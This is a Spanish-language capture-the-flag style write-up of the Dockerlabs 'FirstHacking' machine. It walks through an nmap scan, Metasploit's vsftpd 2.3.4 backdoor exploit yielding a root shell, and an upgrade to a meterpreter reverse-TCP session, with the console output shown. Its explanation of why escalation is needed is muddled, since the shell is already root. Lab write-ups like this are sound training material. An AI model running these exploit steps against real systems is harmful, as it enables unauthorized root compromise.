# Solucion-maquina-FirstHacking-Dockerlabs

Esta maquina/laboratorio controlado, se aplican tecnicas de pen testing basicas. que va desde el reconocimiento de puertos y versiones , hasta   usar un exploit para la version desactualizada del servicio ftp para despues, iniciar una sesion meterpretter con metasploit y despues de ahi, tener el control total de los archivos de la maquina objetivo.


# 1. RECONOCIMIENTNTO
-utilizamos la herramienta de nmap con el siguiente comando :


 nmap -T5 -sV  172.17.0.2

Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-23 21:36 -04
Nmap scan report for 172.17.0.2
Host is up (0.000015s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds

Esto, nos indica que el puerto 21 es el unico abierto, por lo cual es el unico vector para entrar en la maquina ,al ver la version de la maquina  nos damos cuenta de la version del servicio (vsftpd 2.3.4)
esta es una version que salio en Julio de 2011, lo cual es bastante desactualizada para las versiones disponibles de hoy en dia. 

# 2.EXPLOTACION
-abrimos msfconsole y buscamos algun exploit disponible para poder usarlo: 

msf > search vsftpd 2.3.4
Matching Modules


     Name                                  Disclosure Date  Rank       Check  Description

   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03      CENSURED   CENSURED CENSURED
   -  ----                                  ---------------  ----       -----  -----------
como tenemos un exploit que podemos usar usamos el comando show options para ver que nos pide , insertamos todos los datos que pide y ejecutamos con el comando run :

msf exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] 172.17.0.2:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.17.0.2:21 - USER: 331 Please specify the password.
[+] 172.17.0.2:21 - Backdoor service has been spawned, handling...
[+] 172.17.0.2:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 1 opened (172.17.0.1:40135 -> 172.17.0.2:6200) at 2025-12-23 21:40:51 -0400

con esto logramos "acceder" a la maquina , pero no podemos ejecutar comandos por el tipo de sesion que tenemos(session shell) , para resumirlo, debemos escalar privilegios.

# 2.POST-EXPLOTACION (ESCALAR PRIVILEGIOS)
dejamos la sesion en background con control+z , y buscamos con metasploit, una sesion meterpreter para shell: 

msf exploit(unix/ftp/vsftpd_234_backdoor) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter  .                normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter

volvemos a ver cuales son los parametros con show options,  le mandamos los parametro que necesita con set , seleccionamos la session 2 en este casa y ejecutamos con run:

msf post(multi/manage/shell_to_meterpreter) > run
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 172.17.0.1:4433
[*] Sending stage (1062760 bytes) to 172.17.0.2
[*] Meterpreter session 2 opened (172.17.0.1:4433 -> 172.17.0.2:57830) at 2025-12-23 21:46:16 -0400
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
msf post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type                   Information        Connection
  --  ----  ----                   -----------        ----------
  1         shell cmd/unix                            172.17.0.1:40135 -> 172.17.0.2:6200 (172.17.0.2)
  2         meterpreter x86/linux  root @ 172.17.0.2  172.17.0.1:4433 -> 172.17.0.2:57830 (172.17.0.2)

msf post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > ls
Listing: /root/vsftpd-2.3.4
===========================

#MAQUINA VULNERADA Y ESCALADA DE PRIVILEGIOS CON ROOT

 #CONCLUSIONES
La maquina  fue vulnerada gracias a la version de servicio, esto la deja expuesta completamente
 #RECOMENDACIONES
 actualizar la version del servicio



